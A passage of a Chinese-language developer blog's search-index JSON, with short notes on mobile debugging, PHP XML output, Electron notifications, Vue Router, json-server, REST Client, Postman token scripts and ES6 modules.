","date":"2018-10-10","objectID":"/blog/posts/%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98/:0:0","tags":["ssl","tls","wildcard","憑證"],"title":"萬用憑證(WildCard)和中間憑證小記","uri":"/blog/posts/%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"最近公司遇到在Line上面開網頁 會空白頁面…(或正常頁面倒到那一台主機不會有跳頁) 被收到需要做手機上的Debug 當然之前有做過 不過來記錄一次記錄 因為不常做XD ","date":"2018-10-08","objectID":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/:0:0","tags":["Firefox","Chrome"],"title":"在手機上Firefox \u0026Chrome 電腦除錯方法","uri":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"安裝 google adb driver 原本想安裝自家的Driver 不知道win7 x64好像不能用 後來選擇google adb driver 小米5 ADB Interface 驅動程式安裝方式 - 小米手機5 - MIUI官方論壇 Get the Google USB Driver | Android Developers 由於有找到[Android] Windows 安裝 Google 萬用 USB 驅動程式 | 熱血剪貼部詳細文章(備份圖) 所以就沒花費這一塊做筆記了 ","date":"2018-10-08","objectID":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/:0:1","tags":["Firefox","Chrome"],"title":"在手機上Firefox \u0026Chrome 電腦除錯方法","uri":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Firefox安裝 Adb helper WebIDE Add-ons 開啟 WebIde 由上角正常可以看到手機名稱 (圖片待補) 手機點選允許 就可以看console ","date":"2018-10-08","objectID":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/:0:2","tags":["Firefox","Chrome"],"title":"在手機上Firefox \u0026Chrome 電腦除錯方法","uri":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Chrome 除錯模式 遠程調試 Android 設備使用入門 | Tools for Web Developers | Google Developers 設定跟功能上比Firefox多 設定步驟更簡單，可以直接看到網頁圖示 最後憑證的問題還是不清楚為什麼orz ","date":"2018-10-08","objectID":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/:0:3","tags":["Firefox","Chrome"],"title":"在手機上Firefox \u0026Chrome 電腦除錯方法","uri":"/blog/posts/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"最近收到要實作要回傳 XML 的 API 不過，真得已經習慣用 PHP 做 JSON 格式 只需要用 json_encode 就可以搞定 PHP 本身函式就有對 XML 做解析 不過組 XML 好像沒有比較好方式 有查到php - XML creation using CodeIgniter - Stack Overflow Database Utility Class — CodeIgniter 3.1.9 documentation 但這次 DB 剛好存的資料不是剛好要組出來的資料 最終有網路看到原生支援的方法 加上補\u003c![CDATA[ ]]!\u003e 這一段是防止\u003e符號產生錯誤 也不用改寫成\u0026lt; XML CDATA SimpleXMLElement 加上 CDATA 方法 php 使用 simpleXML 添加 CDATA 格式数据 php – 如何使用 SimpleXmlElement 编写 CDATA？ - 代码日志 PHP: DOMDocument::createCDATASection - Manual \u003c?php /** * to show \u003ctitle lang=\"en\"\u003e\u003c![CDATA[Site Title]]\u003e\u003c/title\u003e instead of \u003ctitle lang=\"en\"\u003eSite Title\u003c/title\u003e * */ class SimpleXMLExtended extends SimpleXMLElement { public function addCData($cdata_text) { $node = dom_import_simplexml($this); $no = $node-\u003eownerDocument; $node-\u003eappendChild($no-\u003ecreateCDATASection($cdata_text)); } } $xmlFile = 'config.xml'; // instead of $xml = new SimpleXMLElement('\u003csites/\u003e'); $xml = new SimpleXMLExtended('\u003csites/\u003e'); $site = $xml-\u003eaddChild('site'); // instead of $site-\u003eaddChild('site', 'Site Title'); $site-\u003etitle = NULL; // VERY IMPORTANT! We need a node where to append $site-\u003etitle-\u003eaddCData('Site Title'); $site-\u003etitle-\u003eaddAttribute('lang', 'en'); $xml-\u003easXML($xmlFile); ?\u003e 然後用 PHP 內建多行字串，需要注意用 NOWODC 使用 HEREDOC，裡面有$會抓取 PHP 變數 所以需要用 NOWDOC 出輸內容 Output Class — CodeIgniter 3.1.5 documentation $this-\u003eoutput -\u003eset_content_type('application/json') -\u003eset_output(json_encode(array('foo' =\u003e 'bar'))); $this-\u003eoutput -\u003eset_content_type('jpeg') // You could also use \".jpeg\" which will have the full stop removed before looking in config/mimes.php -\u003eset_output(file_get_contents('files/something.jpg')); 結果 研究完，收到要改寫回傳 JSON 的 api 不過 json 會更簡單 json(xxxx,true) 跟 $json = [ \"test\"=\u003e[ \"number=\u003e[0,1,2,3,4,5] ] ] 寫法有空整理再發文 2019-01-02 補充 Array to XML 的 Library GitHub - Jeckerson/array2xml: [PHP] - Array to XML GitHub - spatie/array-to-xml: A simple class to convert an array to xml 2019-03-12 用原生方法沒辦法載入 xml - How to get values inside \u003c![CDATA[values]] \u003e using php DOM? - Stack Overflow [xml - PHP: How to handle \u003c![CDATA with SimpleXMLElement? - Stack Overflow $content = simplexml_load_string( '\u003ccontent\u003e\u003c![CDATA[Hello, world!]]\u003e\u003c/content\u003e' , null , LIBXML_NOCDATA ); PHP 操作 XML | 程式前沿 ","date":"2018-10-07","objectID":"/blog/posts/CodeIgniter-%E8%BC%B8%E5%87%BAXML-%E7%AD%86%E8%A8%98/:0:0","tags":["xml","codeigenter"],"title":"CodeIgniter 輸出XML 筆記","uri":"/blog/posts/CodeIgniter-%E8%BC%B8%E5%87%BAXML-%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"解決上一篇遇到win10通知沒法出來 electron Notification win 10 失敗小記 | 程式狂想筆記 最後仔細看了官方文件 才解決….. 首先，win8 之後應用程式做通知都需要註冊AppModelUserId 在dev時候很難註冊到(沒有方法) 在查詢一堆資料(NSIS….) 發現需要做安裝動作 才能註冊AppModelUserId node-notifier是透過SnoreToast.exe程式呼叫 所以其實也可以不用安裝這個 首先來看官方AppUserModelId設定 檔案請設定package.json(不是設定electron_dist裡面的) { ...,(第一階層) \"build\": { \"appId\": \"com.example.app\" } } 但可以注意到Common Configuration - electron-builder Configuration¶ appId = com.electron.${name} String - The application id. Used as CFBundleIdentifier for MacOS and as Application User Model ID for Windows (NSIS target only, Squirrel.Windows not supported). It is strongly recommended that an explicit ID is set. productName String - As name, but allows you to specify a product name for your executable which contains spaces and other special characters not allowed in the name property. copyright = Copyright © year ${author} String - The human-readable copyright line for the app. appId預設有設定 所以其實用預設可以不用再package.json設定 最後起在background.js裡面加入app.setUserModelId(\"com.electron.exampleName\")，最後exampleName改成package.json專案名子(name) 之後安裝，執行程式可以看到通知結果 NOTE: 通知安裝完，不會馬上在控制台看到程式設定 要第一次通知才能看到 ","date":"2018-10-01","objectID":"/blog/posts/electron-win-10%E8%A8%AD%E5%AE%9A%E9%80%9A%E7%9F%A5-AppUserMOdelId-electron-builder%E7%9B%B8%E9%97%9C%E8%A8%AD%E5%AE%9A/:0:0","tags":["electron","notification"],"title":"electron win 10設定通知(AppUserModelId)\u0026electron-builder相關NSIS設定","uri":"/blog/posts/electron-win-10%E8%A8%AD%E5%AE%9A%E9%80%9A%E7%9F%A5-AppUserMOdelId-electron-builder%E7%9B%B8%E9%97%9C%E8%A8%AD%E5%AE%9A/"},{"categories":["JavaScript"],"content":"NSIS 取消一件安裝、設定安裝路徑 ..., \"build\":{ \"nsis\":{ \"oneClick\" : false, \"allowToChangeInstallationDirectory\": true } } oneClick是否為一鍵安裝 allowToChangeInstallationDirectory是否讓User改安裝目錄 更多設定我就不寫了 Common Configuration - electron-builder 未來有空可以研究更新 不過目前這個用不到 先留者記錄 Electron应用使用electron-builder配合electron-updater实现自动更新 - 个人文章 - SegmentFault 思否 ","date":"2018-10-01","objectID":"/blog/posts/electron-win-10%E8%A8%AD%E5%AE%9A%E9%80%9A%E7%9F%A5-AppUserMOdelId-electron-builder%E7%9B%B8%E9%97%9C%E8%A8%AD%E5%AE%9A/:1:0","tags":["electron","notification"],"title":"electron win 10設定通知(AppUserModelId)\u0026electron-builder相關NSIS設定","uri":"/blog/posts/electron-win-10%E8%A8%AD%E5%AE%9A%E9%80%9A%E7%9F%A5-AppUserMOdelId-electron-builder%E7%9B%B8%E9%97%9C%E8%A8%AD%E5%AE%9A/"},{"categories":["JavaScruot"],"content":"執行失敗，要算在復仇名單? 還是放棄orz node-notifier - 节点通知模块的问题 查到好像跟node-notifier有關係 SnoreToast.exe -p C：\\Projects\\testSnoreToast\\coulson.png -m Hello -t World -s Notification.Default -appID 貼到win10 cmd不能跑 SnoreToast.exe -m Hello -t World 就會正常看到通知了 我測試我寫的vue-electron 竟然不能跑node-notifier 但網路上有找到 explooosion/electron-alarm-clock: Sample apps for Electron 抓下來可以正常執行…(electron 2.0~3.0也試過，範例都能跑，看來跟版本無關) 目前懷疑是vue cli 3 electron環境執行node-notifier會有問題 不過…嘗試著N方法也不行 electron 2.0~3.0都試過了… 例如加上 app.setAppUserModelId(\"com.electron.test1\"); 也許要用甚麼註冊AppUserModelId才能跑? ID好像有命名規則 CompanyName.ProductName.SubProduct.VersionInformation 但還是不行 orz 網路資源不多 Linux試過都正常，win10不知道為什麼那麼難搞 目前感覺原生electron 的Tray跟Notification 都在Win10失效了QQ ","date":"2018-09-30","objectID":"/blog/posts/electron-Notification-win-10-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98/:0:0","tags":["electron","javascript","notification"],"title":"electron Notification win 10 失敗小記","uri":"/blog/posts/electron-Notification-win-10-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"vuejs hook和router hook小記 檔案 心得/紀錄: Vue hook beforeCreate不會抓到this屬性(props,data)，原因還沒被做出來 component剛建立出來，不會觸發到beforeUpdate,updated，只有template被更新的時候會觸發，但是!!!改data…等等沒觸發到template也不會有問題 Vue Router hook 進行第2次寫入，不會有效果，一樣保持第一次beforeEach hook東西，也許這跟event沒有關係， //測試router hook router.beforeEach((to,from,next)=\u003e{ console.log('1'); }); \u003c!-- 進行第2次寫入，不會有效果，一樣保持第一次beforeEach hook東西 也沒有看到文件說明 --\u003e router.beforeEach((to,from,next)=\u003e{ console.log('2'); console.log(to); console.log(from); console.log(next); }); Vue scrollBehavior 滚动行为，詳細看範例，這篇不好讀 Vue scrollBehavior 滚动行为 - 悦涵 - 博客园 全域router hook的this，應該是指router變數結果…我console.log出來是underfined 子組件 hook beforeRouteEnter (to, from, next) { // 在渲染該組件的對應路由被 confirm 前調用 // 不！能！獲取組件實例 `this` // 因為當守衛執行前，組件實例還沒被創建 }, beforeRouteUpdate (to, from, next) { // 在當前路由改變，但是該組件被覆用時調用 // 舉例來說，對於一個帶有動態參數的路徑 /foo/:id，在 /foo/1 和 /foo/2 之間跳轉的時候， // 由於會渲染同樣的 Foo 組件，因此組件實例會被覆用。而這個鉤子就會在這個情況下被調用。 // 可以訪問組件實例 `this` }, beforeRouteLeave (to, from, next) { // 導航離開該組件的對應路由時調用 // 可以訪問組件實例 `this` } meta 這方面就看官網範例，可以看一下範例註解 順便一提，css有一個scroll-behavior - CSS: Cascading Style Sheets | MDN 但是跟vue沒關係 理解 $nextTick 的作用還沒有研究，剩下就是vuex 參考來源: javascript - vue-router钩子beforeRouteEnter函数获取到this实例 - SegmentFault 思否 路由元信息 | Vue Router 导航守卫 | Vue Router scroll-behavior - CSS: Cascading Style Sheets | MDN Vue scrollBehavior 滚动行为 - 悦涵 - 博客园 理解 $nextTick 的作用 vue2学习篇一 vue-router 导航钩子 丨 智杰之家 - 关注互联网开发 ","date":"2018-09-30","objectID":"/blog/posts/vuejs-hook%E5%92%8Crouter-hook%E5%B0%8F%E8%A8%98/:0:0","tags":["vue"],"title":"vuejs hook和router hook小記","uri":"/blog/posts/vuejs-hook%E5%92%8Crouter-hook%E5%B0%8F%E8%A8%98/"},{"categories":["JavaScript"],"content":"補充上一篇東西 這次有加入了分頁功能 範例程式 心得/開發問題 transition-group mode沒有效果，transition-group有v-move移轉特效 網路上有找到用transition-delay來解決問題 Allow mode for transition-group · Issue #3974 · vuejs/vue · GitHub 上一篇data binding雙向綁定問題，可以使用:value做綁定 但是發現radio會失效，雖然可以使用name方式解決，但是感覺不太滿意 最後想到用JSON.parse(JSON.stringify(xxx))解決 但放到mounted從/edit/:id進來吃不到this.data 最後想到用computed解決 (PS:好像是template出錯，有嘗試著用v-if閃過，但我覺得還是computed解比較漂亮) 2018/09/28 重新實作JS Bin - Collaborative JavaScript Debugging 功能有正常出來 最後新增資料/修改資料，回去首頁的時候，資料還是舊的！我以為是拿出跟之前畫面一樣 但我發現我錯了，簡單做個小實驗 發現router 回去component物件都還會還原，但是data資料不會 但是…是vue-router問題，還是component也會這樣 所以，還是實驗一下到底發生甚麼事情 參考vue_c_test.html vuerouter跟一般component一樣 會重新產出 但是我的回首頁狀態還在 到底發生甚麼事情 後來突然想到會不會父組件傳data給子組件 所以才會造成資料不會重新整理 router 踩雷小記 router 載入compoent是分開的!!!這個好雷 Using a component name in a route definition · Issue #77 · vuejs/vue-router var router = new VueRouter({ routes: [ { path: '/a', component: Vue.component('a-component') }, //router 載入compoent是分開的!!!這個好雷 //[Using a component name in a route definition · Issue #77 · vuejs/vue-router](https://github.com/vuejs/vue-router/issues/77) { path: '/b', component: BComponent } ] }); res.headers.get(\"X-Total-Count\");得出來是數字，放到component可能要注意轉型，parseInt(xxx) [Vue warn]: Invalid prop: type check failed for prop \"records\". Expected Number, got String. found in vue2学习篇一 vue-router 导航钩子 丨 智杰之家 - 关注互联网开发 router hook我還沒有玩到 看來我覺得還會有vueJS-router 新手小記3 ","date":"2018-09-27","objectID":"/blog/posts/vueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A62/:0:0","tags":["vue"],"title":"vueJS router 新手小試2","uri":"/blog/posts/vueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A62/"},{"categories":["實用工具"],"content":"最近使用vscode練vuejs，還沒使用vue cli 想說現在公司專案碰vue cli，微乎其微 但是使用單存vuejs，我覺得還有機會 當然要先熟悉web一下 現在我寫程式都是使用vscode 但最近寫vuejs template沒有變色文字 真的好不習慣，又很傷眼睛 所以就找了一下vscode有沒有好用的套件 ","date":"2018-09-27","objectID":"/blog/posts/vscode-ES6-template-literal-HTML%E4%BA%AE%E5%AD%97%E6%8F%90%E7%A4%BA/:0:0","tags":["vscode"],"title":"vscode ES6 template literal HTML亮字提示","uri":"/blog/posts/vscode-ES6-template-literal-HTML%E4%BA%AE%E5%AD%97%E6%8F%90%E7%A4%BA/"},{"categories":["實用工具"],"content":"es6-string-html 只要前面帶/*html*/，就有完美亮點提示 完美 剛好平常php專案可以考慮這樣用 現在不用考慮IE8了XD ","date":"2018-09-27","objectID":"/blog/posts/vscode-ES6-template-literal-HTML%E4%BA%AE%E5%AD%97%E6%8F%90%E7%A4%BA/:1:0","tags":["vscode"],"title":"vscode ES6 template literal HTML亮字提示","uri":"/blog/posts/vscode-ES6-template-literal-HTML%E4%BA%AE%E5%AD%97%E6%8F%90%E7%A4%BA/"},{"categories":["Javascript"],"content":"最近看了alex直播全家桶，也看了官網router範例 看官網範例可以vuejs/vue-router: 🚦 The official router for Vue.js. git clone回去 npm install npm run dev 有看有懂，但實戰就忘了一堆XD 還是留一下比較 先小記我寫router問題/心得 有搭配json-server json-server db.json --static . http://localhost:3000/index.htm 可以進入到網頁 程式檔案 使用router 帶入param沒法帶vue本生data到component裡面 目前雖然用js閉包做到，但這樣不好看….，目前找不到方法，然到真的用vuex最佳解? router 可以算是全域變數，一直看範例以為要this.$router才能用 (目前猜測 new Vue出來變數可能用$xxx可以抓到) new Vue({ el, router, data }) 第一次嘗試ES6完整縮寫，看起來清爽多了 this.directorys.splice(this.directorys.findIndex( el =\u003e el.id == id), 1) Router傳參數好像不太方便，但說不定有更好的方法(我還沒有嘗試用vuex) // { path: '/edit/:id', component: Edit_c, props: ()=\u003e{ return { data : data.directorys.find( el =\u003e{return el.id == 1 })} }} //帶router帶參數好像只能用props: true // { path: '/edit/:id', component: Edit_c, props: ()=\u003e{ return { data : JSON.parse(JSON.stringify(data.directorys.find( el =\u003e{return el.id == 1 })))} }} //router 帶 props 會連動 地雷，可用json parse stringify 來解決 // 但好像不太能這樣用，一進/edit/xx 會出錯 ajax,fetch,axios 差別，目前查到的資料fetch是基於promise，axios是XHR加Promise，所以很多人都推axios 但我為什麼先用fetch呢?其實是懶得cdnjs找套件XD fetch('/directorys',{ method: 'GET' }).then((res)=\u003e{ if (!res.ok) throw new Error(res.statusText) return res.json(); }).then((data)=\u003e{ this.directorys = data; }); Using Fetch - Web APIs | MDN 从ajax到fetch、axios - 掘金 Jquery ajax, Axios, Fetch区别之我见 - 都选C - SegmentFault 思否 ajax、axios、fetch之间的详细区别以及优缺点 - CSDN博客 Array.prototype.find ,Array.prototype.findIndex很實用 vuejs的table場景特效可以用\u003ctbody\u003e transition-group is not working on tables · Issue #3907 · vuejs/vue 到底讓子元件做ajax查詢資料，還是讓父類別做ajax查詢，說真的感覺component做ajax比較好做，但是感覺寫在父層對component自由度會比較大 但相對 目前覺得很死component(只查某一類東西)在component做會比較好 不然data binding雙向綁定會搞死人，vue-router又不能使用v-once 我現在才想到我是不是因為用v-model關係 才導致雙向綁定，也許我該用v-bind:value才對 orz input[type=radio]在使用vue data binding，用JSON.parse(JSON.stringify(xxxx))轉出物件做bind好像會有問題，後來有想到用computed做，但還沒測試。 router-view到底該不該寫event事件呢?我看很多範例都沒有這樣寫，不知道該寫event bus跟vuex哪個比較好，但是vuex還沒學，我想router搞熟在學會比較好 以上有些疑問可能要復仇名單(我有記得的話，再回來改) 總結 這次code寫的很糟糕，感覺有很多地方可以改進 也了解寫template沒有用vue cli真的很痛苦 就像寫筆記本沒亮度提示，真的很傷眼睛XD router 串大量參數感覺真的很不方便，難道真的要靠vuex解決? 有空研究一下還有什麼方法，閉包解法真的不是很好看 感覺\u003ccomponent is=\"xxx\"\u003e和vue-router比起來 可以做到頁籤分頁功能，我想唯一的是vue-router有做到回上一頁功能 說真的這個真的很方便 但網頁上寫commponent真的很痛苦 難道該跳cli了XD 最後突然想到component有一個keep-alive 就在想router有沒有這玩意 vue-router 之 keep-alive - 简书 最後又想到event問題，官方文件沒有提到 但我實作一下，好像可以用 ","date":"2018-09-26","objectID":"/blog/posts/vueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A6NOTE/:0:0","tags":["vue"],"title":"vueJS router 新手小試","uri":"/blog/posts/vueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A6NOTE/"},{"categories":["網頁特效"],"content":"最近想做出一種波浪特效 所以有找一些網路上現有的資源 SVG+JS驱动的波浪动画 - Yoomin的前端学习笔记 - SegmentFault 思否 DEMO 這個效果不是我要的… 裡面有相關貝茲曲線說明深度掌握SVG路径path的贝塞尔曲线指令 « 张鑫旭-鑫空间-鑫生活 canvas圆形进度球html5水波动画特效 - 素材火 用canvas繪製波浪出來 這個波浪很好看 但是…Canvas我不熟，其實我不需要外框 所以放棄orz svg波浪动画 - caoxuejun - SegmentFault 思否 DEMO 這個適用SVG模擬出來的 纯 CSS 实现波浪效果！ - ChokCoco - 博客园 介紹一堆波浪方法，但我找不到我要的 使用 SVG 轻松实现波浪 (wave) 动画效果 - 前端 - 掘金 demo地址 這個原本很棒，但我不能調整… javascript - 想实现360的波浪进度球效果 - SegmentFault 思否 DEMO網址 把wrapper拿掉border-radius之後 就是我要的方形 QQ 感動 找的過程，挖到不錯的文 chokcoco/iCSS: 谈谈一些有趣的 CSS 话题 安卓自定义View进阶-Path之贝塞尔曲线 發現做個特效，數學可能真的很重要orz 最後採用javascript - 想实现360的波浪进度球效果 - SegmentFault 思否 放在我現在我做的番茄鐘(暫時) 套用在Vue範例檔 ","date":"2018-09-26","objectID":"/blog/posts/%E8%92%90%E9%9B%86%E4%B8%80%E4%BA%9B%E7%B6%B2%E9%A0%81%E6%B3%A2%E6%B5%AA%E5%8B%95%E6%85%8B%E5%9C%96%E7%A4%BA/:0:0","tags":["css","javascript","波浪"],"title":"蒐集一些網頁波浪動態圖示","uri":"/blog/posts/%E8%92%90%E9%9B%86%E4%B8%80%E4%BA%9B%E7%B6%B2%E9%A0%81%E6%B3%A2%E6%B5%AA%E5%8B%95%E6%85%8B%E5%9C%96%E7%A4%BA/"},{"categories":["vsCode"],"content":"最近vscode挖到Rest Client套件 這個有點類似postman 可以直接簡單做Server溝通 簡單測試外，感覺還可以順便寫文件XD 但功能好像有點多，所以我就沒玩很深入 ","date":"2018-09-25","objectID":"/blog/posts/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:0:0","tags":["json","vscode"],"title":"vscode套件Rest Client搭配JSON-Server簡單使用小記","uri":"/blog/posts/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["vsCode"],"content":"JSON-Server 首先可以先裝JSON-Server npm install -g json-server 設定db.json(注意:一定要xxx.json) { \"posts\":[] } 存檔 json-server db.json 簡單就架好一個Restful 測試Server XD 想說要模擬分頁、搜尋沒辦法做到 結果一看他的文件 竟然可以做到typicode/json-server: Get a full fake REST API with zero coding in less than 30 seconds (seriously) #paginate 最近要練VueJS 剛好可以用這個練習 NOTE 2018/09/26 json-server db.json --static .可設定index.html可以直接連http://localhost/index.html ","date":"2018-09-25","objectID":"/blog/posts/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:1:0","tags":["json","vscode"],"title":"vscode套件Rest Client搭配JSON-Server簡單使用小記","uri":"/blog/posts/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["vsCode"],"content":"REST Client ###用來當分格線 ### # 取得資料 GET http://localhost:3000/posts # Content-Type 可以參考 # [四种常见的 POST 提交数据方式 | JerryQu 的小站](https://imququ.com/post/four-ways-to-post-data-in-http.html) ### 新增資料 POST http://localhost:3000/posts HTTP/1.1 Content-Type: application/x-www-form-urlencoded test=2\u0026a=1 # 傳JSON，一定要加content-type: application/json 一定要填寫，不然會錯 ### # 新增資料 POST http://localhost:3000/posts HTTP/1.1 content-type: application/json { \"test\" : 2 } ### # PUT 更新資料 PUT http://localhost:3000/posts/1 HTTP/1.1 content-type: application/json { \"test2\" : \"3\" } ### # DELETE 刪除資料 DELETE http://localhost:3000/posts/1 HTTP/1.1 content-type: application/json { \"test2\" : \"3\" } Huachao/vscode-restclient: REST Client Extension for Visual Studio Code 功能真的太多了… 範例檔案 ","date":"2018-09-25","objectID":"/blog/posts/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:0","tags":["json","vscode"],"title":"vscode套件Rest Client搭配JSON-Server簡單使用小記","uri":"/blog/posts/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"最近同事使用postman抓資料，都需要抓取token所以都需要多一個步驟 所以我就找找有什麼可以不用一直做重複的事情 最後有用出來，但不常用這一定要做一下筆記 首先，Postman有一個很重要的功能Variables 這個變數可以方便設定 於是我在想有什麼方法可以透過Script幫我做抓token，然後設定到變數裡面去 var client_id = 'xxxxx'; var client_secret = 'OOOOOO'; var words = CryptoJS.enc.Utf8.parse(client_id + ':' + client_secret); var base64 = CryptoJS.enc.Base64.stringify(words); console.log('Basic' + base64); pm.sendRequest({ url: 'https://xxxx.com', method: 'POST', header: 'Authorization: Basic ' + base64, body: { mode: 'urlencoded', urlencoded: [ { key: \"scope\", value: \"/main/v1\"}, { key: \"grant_type\", value: \"client_credentials\" }, ] } }, function (err, res) { console.log(res.json()); var token = res.json().access_token; pm.environment.set('token','Bearer ' + token); }); ","date":"2018-09-25","objectID":"/blog/posts/postman-%E4%BD%BF%E7%94%A8pre-request-Script%E6%8A%93token%E7%AF%84%E4%BE%8B/:0:0","tags":["postman"],"title":"Postman 使用pre-request Script抓token範例","uri":"/blog/posts/postman-%E4%BD%BF%E7%94%A8pre-request-Script%E6%8A%93token%E7%AF%84%E4%BE%8B/"},{"categories":["實用工具"],"content":"refresh token Refresh Token的使用場景以及如何與JWT互動 | 程式前沿 ","date":"2018-09-25","objectID":"/blog/posts/postman-%E4%BD%BF%E7%94%A8pre-request-Script%E6%8A%93token%E7%AF%84%E4%BE%8B/:1:0","tags":["postman"],"title":"Postman 使用pre-request Script抓token範例","uri":"/blog/posts/postman-%E4%BD%BF%E7%94%A8pre-request-Script%E6%8A%93token%E7%AF%84%E4%BE%8B/"},{"categories":["JavaScript"],"content":"最近因為學了VueJS，覺得事時候要進入Vue cli環境用用看 但知道Vue cli是使用Webpack 總覺得不了解JS模組化要怎麼寫 之後程式會踩到一堆雷 在此先記錄一些筆記 在之前有看過nodejs的require，JavaScript的import xxxx from ooo 一直以為他們都是大同小意，可能可以互通 但今天看到這篇Node中没搞明白require和import，你会被坑的很惨 - 腾讯Web前端 IMWeb 团队社区 | blog | 团队博客 備份圖 發現完全不一樣 由於我對COMMONJS、AMD跟nodejs不熟悉 所以我這篇指記錄ECMAScript 6 模組化 ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:0:0","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"(模組)導出 export var a = 1; var b = 2; export b; export 1;//不能放不是變數，只能放function name跟object指定 詳細:export - JavaScript | MDN ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:1:0","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"export default // 底下的 function 用 class, function* 也可以 export default expression; export default function (…) { … } export default function name1(…) { … } 一個JS只能放一個export default 在寫模組導入的時候 在說明會比較清楚 基本上export會解析後面放的變數名稱 export {xxxx, oooo,ffff} 當export放物件(大陸翻:對象，最近看中文一直看不懂這詞XD) export { name1 as default, … }; export * from …; export { name1, name2, …, nameN } from …; export { import1 as name1, import2 as name2, …, nameN } from …; 另外要注意的是，如果想 import 的同時 export 出去， 並?不會 export 預設輸出。 export * from …; 你必須額外 import 它的預設輸出，然後再用 export import mod from \"mod\"; export default mod; ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:1:1","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"(模組)導入 如果我們要輸出單獨的 function, object, class 或當做 fallback 值來輸出的話，就可以用預設輸出： // module \"my-module.js\" export default function cube(x) { return x * x * x; } export var b = 1; 外部檔案的 import 用法： import cube from 'my-module'; import {b} from 'my-module'; console.log(cube(3)); // 27 Note 注意預設輸出不能使用 var, let , const。 比較要注意的事情 import後面有沒有{}就不一樣了 {}裡面是放export 變數名稱 沒有的話，import xxx，xxx是指default導出的東西 ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:2:0","tags":["ecmascript6"],"title":"ECMAScript6 